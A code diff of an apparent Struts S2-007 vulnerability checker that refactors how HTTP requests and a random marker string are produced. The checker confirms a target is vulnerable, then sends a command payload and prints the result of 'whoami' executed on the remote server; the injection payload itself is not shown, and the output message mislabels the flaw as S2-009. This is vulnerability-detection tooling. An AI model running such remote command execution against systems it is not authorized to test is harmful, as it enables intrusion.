@@ -9,19 +9,13 @@ import re
 import sys
 import time
 import urllib
-import string
-import random
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.common import get_capta
+from app.lib.utils.request import request
 
 class S2_007_BaseVerify:
     def __init__(self, url):
         self.url = url
-        self.capta='' 
-        words=''.join((string.ascii_letters,string.digits))
-        for i in range(8):
-            self.capta = self.capta + random.choice(words)
+        self.capta = get_capta()
         self.check_payload = {
                 'name': "1",
                 'email': "7777777@qq.com",
@@ -39,9 +33,9 @@ class S2_007_BaseVerify:
                 self.url = "http://" + self.url
             if '.action' not in self.url:
                 self.url = self.url + '/user.action'
-            check_req = requests.post(self.url, data = self.check_payload, timeout = 10, allow_redirects=False, verify = False)
+            check_req = request.post(self.url, data = self.check_payload)
             if self.capta in check_req.text and check_req.status_code == 200:
-                cmd_req = requests.post(self.url, data = self.cmd_payload, timeout = 10, allow_redirects=False, verify = False)
+                cmd_req = request.post(self.url, data = self.cmd_payload)
                 cmd_str = re.sub('\n', '', cmd_req.text)
                 result = re.findall('''<input type="text" name="age" value="(.*?)" id="user_age"/></td>''', cmd_str)
                 print ('存在S2-009漏洞,执行whoami命令成功，执行结果是:', result)
